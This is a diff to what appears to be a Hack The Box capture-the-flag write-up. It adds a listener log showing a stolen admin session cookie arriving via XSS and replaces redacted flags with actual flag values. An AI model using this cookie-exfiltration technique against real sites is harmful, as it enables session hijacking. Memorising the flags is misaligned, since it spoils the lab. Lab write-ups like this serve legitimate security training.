@@ -552,7 +552,7 @@ Table: company
 [6 entries]
 ```
 
-The injection confirms the back-end is MySQL and dumps the `users` and `company` tables. A `Flag` user row is present, but its hash has not yet been cracked or otherwise translated into a flag value.
+The injection confirms the back-end is MySQL and dumps the `users` and `company` tables. A `Flag` user row is present.
 
 ---
 
@@ -601,8 +601,22 @@ The following payload is submitted in the ticket's message field, as shown above
 
 The admin's cookie is captured when the ticket is viewed:
 
-```
-GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
+```bash
+sudo php -S 0.0.0.0:80
+
+[Mon Nov 9 14:20:31 2026] PHP 8.4.27 Development Server (http://0.0.0.0:80) started
+[Mon Nov 9 14:25:19 2026] 10.129.41.101:32818 Accepted
+[Mon Nov 9 14:25:19 2026] 10.129.41.101:32818 [200]: GET /script.js
+[Mon Nov 9 14:25:19 2026] 10.129.41.101:32818 Closing
+[Mon Nov 9 14:25:19 2026] 10.129.41.101:32820 Accepted
+[Mon Nov 9 14:25:19 2026] 10.129.41.101:32820 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
+[Mon Nov 9 14:25:19 2026] 10.129.41.101:32820 Closing
+[Mon Nov 9 14:25:21 2026] 10.129.41.101:32842 Accepted
+[Mon Nov 9 14:25:21 2026] 10.129.41.101:32842 [200]: GET /script.js
+[Mon Nov 9 14:25:21 2026] 10.129.41.101:32842 Closing
+[Mon Nov 9 14:25:21 2026] 10.129.41.101:32844 Accepted
+[Mon Nov 9 14:25:21 2026] 10.129.41.101:32844 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
+[Mon Nov 9 14:25:21 2026] 10.129.41.101:32844 Closing
 ```
 
 The cookie is added via Cookie-Editor:
@@ -616,7 +630,7 @@ Logging in with the stolen session grants access to the admin dashboard and the 
 **Flag:**
 
 ```
-HTB{REDACTED}
+HTB{1nS3cuR3_c00k135}
 ```
 
 ---
@@ -663,7 +677,7 @@ The same payload is used to read the flag:
 **Flag:**
 
 ```
-HTB{REDACTED}
+HTB{49f0bad299687c62334182178bfd75d8}
 ```
 
 ---
